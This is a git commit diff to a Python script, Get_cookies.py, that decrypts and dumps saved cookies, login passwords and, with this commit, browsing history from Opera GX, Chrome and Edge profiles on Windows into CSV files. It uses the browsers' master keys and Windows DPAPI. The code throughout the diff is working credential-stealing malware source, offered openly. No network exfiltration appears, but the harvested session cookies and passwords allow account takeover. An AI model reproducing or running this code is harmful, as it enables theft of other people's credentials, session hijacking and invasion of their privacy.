dbfb05d82959b17db64d47e6239c335cbd7545f8
BiMathAx <61063210+MathKode@users.noreply.github.com>
2022-05-02 19:54:50 +0200

    Add files via upload

--- Get_cookies.py
+++ Get_cookies.py
@@ -30,13 +30,10 @@ def get_cookie(master_key, path_to_db, sql):
     ls=["Site;Nom Cookie;Valeur"]
     for c in data:
         value = decrypt_cookie(c[2],master_key)
-        ls.append(f"{c[0]};{c[1]};{value}")
+        ls.append(f"{c[0].decode()};{c[1].decode()};{value}")
     #--------
     cursor.close()
     return ls
-    
-
-
     
 def decrypt_cookie(cookie, key):
     if cookie[:3] == b'v10': 
@@ -48,6 +45,20 @@ def decrypt_cookie(cookie, key):
         return data.decode()
     else :
         return win32crypt.CryptUnprotectData(cookie)[1].decode()
+
+def get_history(path):
+    file_path = os.environ["USERPROFILE"] + os.sep + path
+    db = sqlite3.connect(file_path)
+    db.text_factory = bytes
+    cursor = db.cursor()
+    cursor.execute("SELECT title, url, visit_count FROM urls;")
+    data = cursor.fetchall()
+    ls=["title;url;visit_count"]
+    for h in data :
+        ls.append(f"{h[0].decode()};{h[1].decode()};{h[2]}")
+    db.close()
+    return ls
+    
 
 MASTER_KEY = [ r"AppData\Roaming\Opera Software\Opera GX Stable\Local State",
                r"AppData\Local\Google\Chrome\User Data\Local State",
@@ -61,11 +72,18 @@ PASSWORD = [ r"AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
              r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
              r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data" ]
 
+HISTORY = [ r"AppData\Roaming\Opera Software\Opera GX Stable\History",
+             r"AppData\Local\Google\Chrome\User Data\Default\History",
+             r"AppData\Local\Microsoft\Edge\User Data\Default\History" ]
+
 SQL = [ "SELECT host_key, name, encrypted_value FROM cookies;",            #Cookies
         "SELECT origin_url, username_value, password_value FROM logins;"]  #Login Data
 
+#print(get_history(HISTORY[0]))
 
 def main():
+    if "result_ripper" not in os.listdir():
+        os.mkdir("result_ripper")
     print("-- Récupération des masters keys --")
     master_key = []
     t=0
@@ -107,26 +125,59 @@ def main():
             print(i,"Error")
         t += 1
 
+    print("\n-- Récupération des Historiques --")
+    history = [[],[],[]]
+    t=0
+    for i in ["Opera GX", "Chrome", "Edge"]:
+        if master_key[t] != "":
+            try :
+                history[t] = get_history(HISTORY[t])
+                print(i,"SUCCESS")
+            except :
+                print(i,"Error")
+        else :
+            print(i,"Error")
+        t += 1
+
     print("\n-- Save Result --")
     t=0
     for i in ["Opera GX", "Chrome", "Edge"]:
         try :
-            file = open(f"{i}_cookies.csv","w")
-            file.write("\n".join(cookies[t]))
-            file.close()
-            print(i,"Cookies SUCCESS")
+            if cookies[t] != [] :
+                file = open(f"result_ripper/{i}_cookies.csv","w")
+                file.write("\n".join(cookies[t]))
+                file.close()
+                print(i,"Cookies SUCCESS")
+            else :
+                print(i,"Cookies Error")
         except:
             print(i,"Cookies Error")
         t+=1
     t=0
     for i in ["Opera GX", "Chrome", "Edge"]:
         try :
-            file = open(f"{i}_login.csv","w")
-            file.write("\n".join(password[t]))
-            file.close()
-            print(i,"Login SUCCESS")
+            if password[t] != [] :
+                file = open(f"result_ripper/{i}_login.csv","w")
+                file.write("\n".join(password[t]))
+                file.close()
+                print(i,"Login SUCCESS")
+            else :
+                print(i,"Login Error")
         except:
             print(i,"Login Error")
+        t+=1
+    t=0
+    for i in ["Opera GX", "Chrome", "Edge"]:
+        try :
+            if history[t] != [] :
+                file = open(f"result_ripper/{i}_history.csv","w")
+                file.write("\n".join(history[t]))
+                file.close()
+                print(i,"History SUCCESS")
+            else :
+                print(i,"History Error")
+        except:
+            print(i,"History Error")
         t+=1
     print("-- END --")
 
